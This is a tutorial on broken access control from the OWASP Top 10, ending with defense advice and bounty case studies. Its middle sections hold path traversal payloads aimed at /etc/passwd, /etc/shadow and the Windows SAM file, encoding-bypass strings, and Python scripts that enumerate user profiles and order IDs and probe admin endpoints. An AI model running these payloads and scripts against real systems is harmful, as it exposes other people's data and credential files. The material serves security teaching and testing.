# OWASP Top 10 2025 - A01: Broken Access Control complete guide

## Learning Objectives
Master the core principles, attack techniques, and defense methods of broken access control

---

## 1. Broken Access Control Overview

### 1.1 What is Access Control?
Access Control is a set of policies and techniques used to control who can access what resources and what operations they can perform.

**Core Elements**:
- **Authentication**: Who are you?
- **Authorization**: What can you do?
- **Auditing**: What did you do?

### 1.2 What is Broken Access Control?
Broken Access Control occurs when an application fails to properly enforce access control policies, allowing attackers to:
- Access unauthorized resources
- Perform unauthorized operations
- View or modify other users' data
- Escalate privileges

---

## 2. Types of Access Control Failures

### 2.1 Vertical Privilege Escalation
**Definition**: Low-privilege user accessing high-privilege functions

**Example Scenarios**:
```
Regular User -> Admin Functions
Guest → Admin Panel
User → System Administration
```

**Vulnerable Code**:
```php
// Insecure code
if ($_SESSION['role'] == 'admin') {
    // Admin functions
}

// Attacker directly accesses admin.php
// Accessible without verification
```

**Attack Methods**:
```
1. Directly access admin URLs
2. Modify request parameters
3. Forge session tokens
4. Exploit role confusion
```

---

### 2.2 Horizontal Privilege Escalation
**Definition**: Privilege boundary violation between users of the same level

**Example Scenarios**:
```
User A -> User B's Data
User1 → User2's Profile
Account1 → Account2's Orders
```

**Vulnerable Code**:
```php
// Insecure code
$user_id = $_GET['user_id'];
$query = "SELECT * FROM users WHERE id = $user_id";
// No verification of whether current user has permission to access this user_id
```

**Attack Methods**:
```
1. IDOR (Insecure Direct Object Reference)
2. Modify ID parameters
3. Enumerate user IDs
4. Guess other users' data
```

---

### 2.3 IDOR (Insecure Direct Object Reference)
**Definition**: Application directly uses user-provided input to access database objects without permission verification

**Vulnerability Example**:
```http
GET /api/users/123/profile HTTP/1.1

Attacker modifies:
GET /api/users/124/profile HTTP/1.1
GET /api/users/125/profile HTTP/1.1
```

**Common IDOR Scenarios**:
1. **User profiles**: `/profile?id=123`
2. **Order information**: `/order?order_id=456`
3. **File downloads**: `/download?file_id=789`
4. **Message viewing**: `/message?msg_id=012`

---

### 2.4 Path Traversal
**Definition**: Accessing arbitrary files in the file system, bypassing access controls

**Payload**:
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Vulnerable Code**:
```php
// Insecure code
$file = $_GET['file'];
include("pages/" . $file);

// Attack
GET /page?file=../../../etc/passwd
```

---

### 2.5 Permission Bypass
**Definition**: Bypassing access control check mechanisms

**Common Bypass Methods**:
1. **HTTP Method Tampering**
```
POST /admin/delete_user HTTP/1.1
↓ changed to
GET /admin/delete_user HTTP/1.1
```

2. **Parameter Pollution**
```
GET /admin?role=user&role=admin HTTP/1.1
```

3. **Case Confusion**
```
GET /Admin/DeleteUser HTTP/1.1
GET /ADMIN/delete_user HTTP/1.1
```

4. **Encoding Bypass**
```
GET /%61dmin/%64elete HTTP/1.1
GET /admin%2fdelete HTTP/1.1
```

---

## 3. Access Control Failure Detection Techniques

### 3.1 Manual Testing

#### Step 1: Create Multiple Test Accounts
```
Account 1: user1 (regular user)
Account 2: user2 (regular user)
Account 3: admin (administrator)
```

#### Step 2: Capture Requests with Burp Suite
```
1. Log in as user1
2. Capture all requests
3. Record all URLs and parameters
```

#### Step 3: Replay Request Testing
```
1. Replay user1's requests using user2's session
2. Try modifying ID parameters
3. Try accessing admin functions
```

---

### 3.2 Automated Detection

#### IDOR Automated Detection Script
```python
#!/usr/bin/env python3
"""
IDOR Automated Detection Tool
Detect Insecure Direct Object References
"""

import requests
import re
from concurrent.futures import ThreadPoolExecutor

class IDORDetector:
    def __init__(self, base_url, session_token):
        self.base_url = base_url
        self.session_token = session_token
        self.session = requests.Session()
        self.session.headers.update({
            'Cookie': f'session={session_token}'
        })
    
    def find_id_parameters(self, url):
        """Find possible ID parameters"""
        patterns = [
            r'[?&](\w*id\w*)=([^&]+)',
            r'[?&](\w*user\w*)=([^&]+)',
            r'[?&](\w*order\w*)=([^&]+)',
            r'[?&](\w*file\w*)=([^&]+)',
        ]
        
        params = []
        for pattern in patterns:
            matches = re.finditer(pattern, url, re.IGNORECASE)
            for match in matches:
                params.append({
                    'param': match.group(1),
                    'value': match.group(2)
                })
        
        return params
    
    def test_idor(self, url, param_name, original_value):
        """Test IDOR vulnerabilities"""
        print(f"[*] Test: {param_name}={original_value}")
        
        # Test range: 10 numbers before and after original value
        test_values = []
        
        # If numeric ID
        if original_value.isdigit():
            num = int(original_value)
            test_values = [str(num + i) for i in range(-10, 11) if num + i > 0]
        else:
            # If string ID, try common IDs
            test_values = ['1', '2', '3', 'admin', 'test']
        
        vulnerabilities = []
        
        for test_value in test_values:
            if test_value == original_value:
                continue
            
            # constructTest URL
            test_url = url.replace(f"{param_name}={original_value}", 
                                   f"{param_name}={test_value}")
            
            try:
                r = self.session.get(test_url, timeout=5)
                
                # Check response differences
                if r.status_code == 200:
                    vulnerabilities.append({
                        'param': param_name,
                        'original': original_value,
                        'test': test_value,
                        'status': r.status_code,
                        'length': len(r.text)
                    })
                    print(f"    [+] Possible IDOR: {param_name}={test_value}")
            
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def scan_url(self, url):
        """Scan single URL"""
        params = self.find_id_parameters(url)
        
        all_vulns = []
        for param in params:
            vulns = self.test_idor(url, param['param'], param['value'])
            all_vulns.extend(vulns)
        
        return all_vulns

# Usage example
if __name__ == "__main__":
    detector = IDORDetector(
        base_url="http://example.com",
        session_token="your_session_token"
    )
    
    # Test URLs
    test_urls = [
        "http://example.com/profile?user_id=123",
        "http://example.com/order?id=456",
    ]
    
    for url in test_urls:
        vulns = detector.scan_url(url)
        if vulns:
            print(f"\n[+] Found {len(vulns)} possible IDOR vulnerabilities")
```

---

### 3.3 Privilege Escalation Detection

#### Vertical Privilege Escalation Detection
```python
#!/usr/bin/env python3
"""
Vertical Privilege Escalation Detection Tool
Detect whether regular users can access admin functions
"""

import requests

class PrivilegeEscalationDetector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_admin_access(self, user_token, admin_endpoints):
        """Test whether regular users can access admin endpoints"""
        self.session.headers.update({
            'Cookie': f'session={user_token}'
        })
        
        vulnerabilities = []
        
        for endpoint in admin_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                r = self.session.get(url, timeout=5)
                
                if r.status_code == 200:
                    vulnerabilities.append({
                        'endpoint': endpoint,
                        'status': r.status_code,
                        'accessible': True
                    })
                    print(f"[+] Accessible: {endpoint}")
            
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def test_role_manipulation(self):
        """Test role parameter tampering"""
        test_cases = [
            {'role': 'admin'},
            {'role': 'administrator'},
            {'role': 'superuser'},
            {'is_admin': 'true'},
            {'is_admin': '1'},
        ]
        
        # ... Implementation details
```

---

## 4. Access Control Failure Exploitation Techniques

### 4.1 IDOR Exploitation

#### Case 1: User Profile Leak
**Vulnerable URL**: `/api/v1/users/123/profile`

**Exploitation Steps**:
```
1. Log in to user account
2. Access own profile: /api/v1/users/123/profile
3. Modify ID: /api/v1/users/124/profile
4. Enumerate all user IDs
```

**Automated Exploitation**:
```python
import requests

base_url = "http://target.com/api/v1/users"
session_token = "your_token"

for user_id in range(1, 1000):
    url = f"{base_url}/{user_id}/profile"
    headers = {'Cookie': f'session={session_token}'}
    
    r = requests.get(url, headers=headers)
    
    if r.status_code == 200:
        print(f"[+] User {user_id}: {r.json()}")
```

---

#### Case 2: Order Information Leak
**Vulnerable URL**: `/order?id=ORD-2024-001`

**Exploitation Steps**:
```
1. Place order to get own order ID
2. Analyze order ID patterns
3. Construct other users' order IDs
4. Access other users' orders
```

**Order ID Brute Force**:
```python
import requests
from datetime import datetime

base_url = "http://target.com/order"
session_token = "your_token"

# Generate possible order IDs
current_year = datetime.now().year

for year in range(2020, current_year + 1):
    for seq in range(1, 10000):
        order_id = f"ORD-{year}-{seq:03d}"
        url = f"{base_url}?id={order_id}"
        
        headers = {'Cookie': f'session={session_token}'}
        r = requests.get(url, headers=headers)
        
        if r.status_code == 200:
            print(f"[+] Order {order_id}: Found")
```

---

### 4.2 Path Traversal Exploitation

#### Read Sensitive Files
**Payload Collection**:
```
# Linux
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../proc/self/environ

# Windows
..\..\..\..\windows\system32\config\sam
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini

# Bypass techniques
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
```

**Automated Detection**:
```python
import requests

payloads = [
    '../../../etc/passwd',
    '../../../etc/shadow',
    '../../../windows/win.ini',
    '../../../proc/self/environ',
]

for payload in payloads:
    url = f"http://target.com/file?name={payload}"
    r = requests.get(url)
    
    if 'root:' in r.text or '[extensions]' in r.text:
        print(f"[+] Path Traversal Found: {payload}")
```

---

### 4.3 Permission Bypass Exploitation

#### HTTP Method Tampering
```python
import requests

# Original request
url = "http://target.com/admin/delete_user?id=123"

# Try different HTTP methods
methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']

for method in methods:
    r = requests.request(method, url)
    
    if r.status_code != 403 and r.status_code != 401:
        print(f"[+] Method {method} allowed: {r.status_code}")
```

---

## 5. Access Control Defense

### 5.1 Implement Least Privilege Principle
```
1. Deny all access by default
2. Grant only necessary permissions
3. Regularly review permissions
4. Use Role-Based Access Control (RBAC)
```

### 5.2 Implement Access Control Checks
```php
// Secure code example
function can_access_user($current_user_id, $target_user_id) {
    // Check if it's the same user
    if ($current_user_id == $target_user_id) {
        return true;
    }
    
    // Check if admin
    if (is_admin($current_user_id)) {
        return true;
    }
    
    // Check for specific permission
    if (has_permission($current_user_id, 'view_all_users')) {
        return true;
    }
    
    return false;
}

// Using
if (!can_access_user($_SESSION['user_id'], $_GET['user_id'])) {
    http_response_code(403);
    die('Access denied');
}
```

### 5.3 Avoid Direct Object References
```php
// Insecure
$user_id = $_GET['user_id'];

// Secure - Use indirect references
$user_id = decrypt_indirect_reference($_GET['ref']);
```

### 5.4 Implement Rate Limiting
```
1. Limit API call frequency
2. Prevent ID enumeration
3. Log abnormal access
4. Auto-ban malicious IPs
```

---

## 6. Access Control Failure Case Studies

### Case 1: Facebook IDOR (2019)
**Vulnerability**: Could view any user's phone number
**Bounty**: $20,000

**Vulnerability Details**:
- Endpoint: `/api/v1/user/{user_id}/phone`
- Issue: No verification of whether current user has permission to view the phone number
- Exploitation: Enumerate user_id to get all users' phone numbers

---

### Case 2: Uber Vertical Privilege Escalation (2020)
**Vulnerability**: Regular users could access admin functions
**Bounty**: $15,000

**Vulnerability Details**:
- Issue: Frontend hid admin menu, but backend didn't verify
- Exploitation: Directly access admin API endpoints
- Impact: Could modify driver info, view financial data

---

## 7. Learning Checklist

### Theory Mastery
- [x] Understand broken access control principles
- [x] Master 5 types of failures
- [x] Understand IDOR mechanism
- [x] Master privilege escalation techniques

### Practical Skills
- [x] IDOR vulnerability detection
- [x] Path traversal exploitation
- [x] Permission bypass testing
- [x] Automated tool development

### Defense Capability
- [x] Implement least privilege principle
- [x] Code auditing
- [x] Access control design
- [x] Security configuration

---

**Document Version**: 1.0
**Created**: 2026-03-26 18:16
**Estimated Study Time**: 6-8 hours
**Status**: In Progress
